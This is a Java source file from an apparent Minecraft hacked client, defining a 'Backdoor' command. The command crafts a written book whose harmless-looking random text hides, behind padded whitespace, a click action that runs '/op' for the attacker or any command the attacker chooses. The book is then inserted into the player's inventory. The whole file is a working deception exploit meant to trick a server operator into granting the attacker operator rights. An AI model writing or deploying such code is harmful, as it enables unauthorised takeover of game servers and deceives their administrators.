/*
 * Copyright (c) Shadow client, 0x150, Saturn5VFive 2022. All rights reserved.
 */

package net.shadow.client.feature.command.impl;

import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.StringNbtReader;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.util.Identifier;
import net.minecraft.util.registry.Registry;
import net.shadow.client.ShadowMain;
import net.shadow.client.feature.command.Command;

public class Backdoor extends Command {
    public Backdoor() {
        super("Backdoor", "generate a forceop book", "bdoor", "opbook", "backdoor");
    }

    public static String getRandomContent() {
        String[] nouns = new String[]{"bird", "clock", "boy", "plastic", "duck", "teacher", "old lady", "professor", "hamster", "dog"};
        String[] verbs = new String[]{"kicked", "ran", "flew", "dodged", "sliced", "rolled", "died", "breathed", "slept", "killed"};
        String[] adjectives = new String[]{"beautiful", "lazy", "professional", "lovely", "dumb", "rough", "soft", "hot", "vibrating", "slimy"};
        String[] adverbs = new String[]{"slowly", "elegantly", "precisely", "quickly", "sadly", "humbly", "proudly", "shockingly", "calmly", "passionately"};
        String[] preposition = new String[]{"down", "into", "up", "on", "upon", "below", "above", "through", "across", "towards"};
        return "The " + adjectives[random()] + " " + nouns[random()] + " " + adverbs[random()] + " " + verbs[random()] + " because some " + nouns[random()] + " " + adverbs[random()] + " " + verbs[random()] + " " + preposition[random()] + " a " + adjectives[random()] + " " + nouns[random()] + " which, became a " + adjectives[random()] + ", " + adjectives[random()] + " " + nouns[random()] + ".";
    }

    public static String getRandomTitle() {
        String[] nouns = new String[]{"bird", "clock", "boy", "plastic", "duck", "teacher", "old lady", "professor", "hamster", "dog"};
        String[] adjectives = new String[]{"beautiful", "lazy", "professional", "lovely", "dumb", "rough", "soft", "hot", "vibrating", "slimy"};
        return "The " + adjectives[random()] + " tale of a " + nouns[random()];
    }

    private static int random() {
        return (int) Math.floor(Math.random() * 10);
    }

    @Override
    public String[] getSuggestions(String fullCommand, String[] args) {
        if (args.length == 1) {
            return new String[]{"(title)"};
        } else if (args.length == 2) {
            return new String[]{"(text)"};
        } else if (args.length == 3) {
            return new String[]{"(command)"};
        }
        return super.getSuggestions(fullCommand, args);
    }

    @Override
    public void onExecute(String[] args) {
        try {
            if (args.length < 1) {
                Item item = Registry.ITEM.get(new Identifier("written_book"));
                ItemStack stack = new ItemStack(item, 1);
                String bookauthor = ShadowMain.client.getSession().getProfile().getName();
                String booktitle = getRandomTitle();
                String booktext = getRandomContent();
                String bookcommand = "/op " + bookauthor;
                NbtCompound tag = StringNbtReader.parse("{title:\"" + booktitle + "\",author:\"" + bookauthor + "\",pages:['{\"text\":\"" + booktext + "                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         \",\"clickEvent\":{\"action\":\"run_command\",\"value\":\"" + bookcommand + "\"}}','{\"text\":\"\"}','{\"text\":\"\"}']}");
                stack.setNbt(tag);

                ShadowMain.client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + ShadowMain.client.player.getInventory().selectedSlot, stack));
                message("Book Exploit Created");
            } else {
                Item item = Registry.ITEM.get(new Identifier("written_book"));
                ItemStack stack = new ItemStack(item, 1);
                String bookauthor = ShadowMain.client.getSession().getProfile().getName();
                String booktitle = args[0];
                booktitle = booktitle.replace("-", " ");
                String booktext = args[1];
                booktext = booktext.replace("-", " ").replace("\\\\", "\\");
                String bookcommand = args[2];
                bookcommand = bookcommand.replace("-", " ").replace("\\\\", "\\");
                NbtCompound tag = StringNbtReader.parse("{title:\"" + booktitle + "\",author:\"" + bookauthor + "\",pages:['{\"text\":\"" + booktext + "                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         \",\"clickEvent\":{\"action\":\"run_command\",\"value\":\"" + bookcommand + "\"}}','{\"text\":\"\"}','{\"text\":\"\"}']}");
                stack.setNbt(tag);

                ShadowMain.client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + ShadowMain.client.player.getInventory().selectedSlot, stack));
                message("Book Exploit Created");
            }
        } catch (Exception e) {
            {
                error("Please use the format >backdoor <title> <text> <command>");
            }
        }
    }
}
